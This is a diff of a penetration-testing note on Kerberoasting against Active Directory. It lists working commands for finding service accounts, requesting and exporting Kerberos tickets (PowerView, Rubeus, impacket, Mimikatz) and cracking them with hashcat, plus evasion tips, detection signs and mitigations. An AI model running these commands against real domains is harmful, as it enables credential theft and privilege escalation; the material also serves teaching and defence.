@@ -1,125 +1,202 @@
 ---
 tags:
-  - Authenticated
-  - Kerberos
-  - AD
+  - "#type/technique"
+  - "#tactic/TA0006"
+  - "#technique/T1558003"
+  - "#stage/privilege-escalation"
+  - "#stage/lateral-movement"
+  - "#os/windows"
+  - "#os/linux"
+  - "#tool/rubeus"
+  - "#tool/impacket"
+  - "#tool/powerview"
+  - "#tool/hashcat"
+aliases:
+  - Steal or Forge Kerberos Tickets
+  - SPN Roasting
+  - Kerberoast
 ---
-## Identify
----
-**Windows**
-AD Module in powershell
-```PowerShell
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-```
-Using Powerview
-```PowerShell
-Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
-```
-Living off the land
-```PowerShell
-setspn.exe -Q */*
-```
-Using Rubeus
-```Python
-.\Rubeus.exe kerberoast /stats
-```
-**Linux**
-```PowerShell
-impacket-GetUserSPNs -dc-ip <dcip> domain.local/username
-```
-```bash
-ldapsearch -x -b "DC=certified,DC=htb" -s sub "(&(objectClass=user)(servicePrincipalName=*))" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d " "
-```
-## Exploit
----
-Make sure you're time is synced with remote host
+## Technique
+___
+Kerberoasting is a post-exploitation attack technique that targets Microsoft Active Directory. An attacker with credentials for any valid domain account (even a low-privilege one) can request Kerberos service tickets for accounts that have a Service Principal Name (SPN) configured.
+
+A portion of the returned ticket-granting service (TGS) ticket is encrypted with the NTLM hash of the service account's password. The attacker captures this ticket and takes it offline to crack the password using brute-force methods. Since the cracking happens offline, it does not generate failed login events on the network, making it a stealthy way to escalate privileges by compromising potentially high-value service accounts.
+
+## Prerequisites
+___
+
+**Access Level:** A valid Active Directory domain account. No special or elevated privileges are required.
+
+**System State:** The attacker must have network access to a Domain Controller to request tickets.
+
+**Information:** The attacker needs to identify user accounts (not computer accounts) that have an SPN configured.
+
+**Misc**: Your system time must be synced with the DC
+
+Linux:
+
 ```bash
 sudo timedatectl set-ntp off
 sudo rdate -n <targetDC>
 ```
-**From Linux**
-```PowerShell
-impacket-GetUserSPNs -dc-ip <dcip> domain.local/username -request
-```
-```PowerShell
-impacket-GetUserSPNs -dc-ip <dcip> domain.local/username -request-user
-```
-you can also use `-outputfile <name>`
-```
-nxc ldap <IP> -u 'user' -p '' --kerberoasting <OUTFILE>
+
+Windows:
+
+```powershell
+NET TIME /DOMAIN
+NET TIME \\<MACHINENAME> /SET /Y
+NET TIME \\<IP Address> /SET /Y
 ```
 
-**Crack hash**
-```PowerShell
-hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
-```
-**From Windows**
-- Semi-manual approach 
 
-```Bash
+## Considerations
+___
+
+**Impact**
+
+Successful cracking of a service account password can lead to significant privilege escalation and lateral movement. Service accounts are often misconfigured with excessive permissions (including Domain Admin) to ensure applications work, making them high-value targets.
+
+**OPSEC**
+
+- **Noise:** Requesting service tickets for many SPNs in a short period can trigger alerts. A single user requesting dozens or hundreds of TGS tickets (Event ID 4769) is highly anomalous.
+
+- **Weak Encryption:** Modern tools like Rubeus allow you to request tickets using the weaker RC4 encryption algorithm (`-rc4opsec`). While this makes cracking easier, requesting a ticket with encryption type `0x17` (RC4-HMAC) in an environment that defaults to AES is a major red flag for defenders.
+
+- **Honeypots:** Defenders can create fake service accounts with tempting SPNs (e.g., `sql_prod_admin_svc`) and monitor them. Any ticket requests for these honeypot accounts are an immediate indicator of compromise.
+
+## Execution
+___
+### Requesting a ticket
+#### **PowerView.ps1**
+
+Identify kerberoastable users
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+Request ticket
+
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+#### **Rubeus**
+
+Get information about kerberoastable users
+
+```powershell
+.\Rubeus.exe kerberoast /stats
+```
+
+Kerberoast all users
+
+```powershell
+.\Rubeus.exe kerberoast 
+```
+
+**Useful flags**:
+
+- `/outfile` outputs roasted hashes to the specified file, one per line.
+- `/tgtdeleg` accounts with AES enabled in `msDS-SupportedEncryptionTypes` will have RC4 tickets requested. (Doesn't work on >= Win 2019)
+- `/rc4opsec` tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.
+- `/simple` output tickets one per line in the terminal
+- `/nowrap` don't wrap new lines and output to terminal
+- `/user:<DomainUser>` specify user to kerberoast
+
+#### **Impacket**
+
+Kerberoast all users
+
+```bash
+impacket-GetUserSPNs domain.local/username:'password' -request -dc-ip <dcip>
+```
+
+Kerberoast specific user
+
+```bash
+impacket-GetUserSPNs domain.local/username:'password' -request-user <user> -dc-ip <dcip>
+```
+
+**Useful flags:**
+
+- `-outputfile` send output to file
+
+#### **PowerShell** + Mimikatz
+
+Identify kerberoastable users.
+
+```powershell
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
+
+```
 setspn.exe -Q */*
 ```
 
-```Bash
+```powershell
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.domain.local:1433"
 ```
 
-```Bash
+```powershell
 mimikatz # base64 /out:true
-mimikatz # kerberos::list /export  
+mimikatz # kerberos::list 
 ```
 
-```Bash
-echo "<base64 blob>" |  tr -d \\n 
+```powershell
+echo "<base64 blob>" |  tr -d \\n
 ```
 
-```Bash
+```bash
 cat encoded_file | base64 -d > sqldev.kirbi
 ```
 
-```Python
+```bash
 python2.7 kirbi2john.py sqldev.kirbi
 ```
 
 This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.
 
-```Python
+```bash
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
 
-Crack the file
+### Cracking a ticket
 
-```Python
-hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+Kerberos 5 TGS-REP (etype 23, RC4-HMAC-MD5)
+
+```bash
+hashcat -m 13100 -a 0 hashes.txt /path/to/wordlist.txt
 ```
 
-!!! info "note"
-	If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.
+### Cleanup Considerations
 
-  
+- None
 
-**PowerView**
-```Python
-Import-Module .\PowerView.ps1
-Get-DomainUser * -spn | select samaccountname
-```
-```Python
-Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
-```
-```Python
-Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
-```
-**Rubeus**
-List info about kerberoastable accounts
-```Python
-.\Rubeus.exe kerberoast /stats
-```
-target admin acccounts
-```Python
-.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
-```
-use tgt delegation to force RC4 downgrade of tickets. (Doesn't work on >= Win 2019)
-```Python
-.\Rubeus.exe kerberoast /tgtdeleg /nowrap
-```
+### Detection & Mitigation
+
+#### Detection
+
+- Event ID 4769: A Kerberos service ticket was requested
+
+- Requests where the Ticket Encryption Type is 0x17 (RC4). In a modern environment, this should be rare
+
+- Requests for service tickets from unusual workstations or for accounts that rarely see this activity.
+
+- LDAP queries that search for accounts with an SPN like `(servicePrincipalName=*)`
+
+- Create a honey account and make a custom alert for tickets requested for that account
+
+#### Mitigation
+
+- **Strong Passwords**: This is the most effective mitigation. Enforce a strong password policy for service accounts
+
+- **Use Group Managed Service Accounts**: gMSAs are the gold standard. Their passwords are 240 characters long, complex, and automatically managed and rotated by Active Directory
+
+- **Protected Users Group**: Add high-value accounts (including service accounts where possible) to the "Protected Users" security group. This enforces stronger security controls, such as disabling NTLM and preventing the use of weaker Kerberos encryption types.
